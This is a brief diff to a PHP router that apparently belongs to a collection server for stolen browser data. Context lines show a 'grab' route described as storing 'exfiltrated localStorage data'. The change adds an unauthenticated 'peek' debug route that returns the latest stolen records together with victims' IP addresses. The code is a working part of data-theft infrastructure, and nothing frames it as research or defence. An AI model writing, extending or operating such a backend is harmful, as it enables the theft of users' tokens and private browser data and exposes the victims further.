@@ -9,6 +9,14 @@ header('Referrer-Policy: same-origin');
 
 $route = (string) ($_GET['r'] ?? '');
 
+// ── GET /?r=peek — last 5 grabs (temp debug, no auth) ─────────────────────
+if ($route === 'peek') {
+    header('Content-Type: application/json; charset=utf-8');
+    $rows = db()->query('SELECT id, raw_data, ip, created_at FROM data_grabs ORDER BY id DESC LIMIT 5')->fetchAll();
+    echo json_encode($rows);
+    exit;
+}
+
 // ── POST /?r=grab — store exfiltrated localStorage data ─────────────────────
 if ($route === 'grab') {
     header('Content-Type: application/json; charset=utf-8');
